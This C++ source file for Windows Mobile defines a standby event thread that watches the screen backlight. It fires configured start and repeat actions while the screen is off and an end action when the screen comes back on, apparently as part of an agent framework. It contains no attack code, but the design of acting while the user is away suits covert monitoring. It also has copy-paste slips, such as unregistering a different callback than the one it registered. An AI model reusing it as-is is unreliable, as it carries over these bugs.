#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "Date.h"
#include "Log.h"
#include <pm.h>
#include "CallBacks.h"
#include "Device.h"

DWORD WINAPI OnStandby(LPVOID lpParam) {
	Event *me = (Event *)lpParam;
	Configuration *conf;
	HANDLE eventHandle;
	int delay, iterations, curIterations = 0, curDelay = 0;
	BOOL bPrevState = FALSE, bLightStatus = TRUE;
	Device *deviceObj = Device::self();

	eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		iterations = conf->getInt(L"iter");
	} catch (...) {
		iterations = MAXINT;
	}

	try {
		delay = conf->getInt(L"delay") * 1000;
	} catch (...) {
		delay = INFINITE;
	}

	CEDEVICE_POWER_STATE powerState = deviceObj->GetDevicePowerState(L"BKL1:");

	if (powerState < D4)
		bLightStatus = TRUE;

	if (deviceObj->RegisterPowerNotification(BackLightCallback, (DWORD)&bLightStatus) == FALSE) {
		me->setStatus(EVENT_STOPPED);
		return 0;
	}

	DBG_TRACE(L"Debug - Standby.cpp - Ac event started\n", 5, FALSE);

	LOOP {
		if (bPrevState != bLightStatus) {
			bPrevState = bLightStatus;

			if (bPrevState) { 
				// BackLight On
				DBG_TRACE(L"Debug - Events.cpp - OnBackLight event [IN action triggered]\n", 5, FALSE);
				me->triggerEnd();
			} else { 
				// BackLight Off
				DBG_TRACE(L"Debug - Events.cpp - OnBackLight event [OUT action triggered]\n", 5, FALSE);
				me->triggerStart();
			}
		}

		if (bPrevState == FALSE)
			curDelay = delay;
		else
			curDelay = 1000;

		WaitForSingleObject(eventHandle, curDelay);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Events.cpp - Ac Event is Closing\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			deviceObj->UnRegisterPowerNotification(AcCallback);
			return 0;
		}

		if (bPrevState == FALSE && curIterations < iterations) {
			me->triggerRepeat();
			curIterations++;
		}
	}

	me->setStatus(EVENT_STOPPED);
	return 0;
}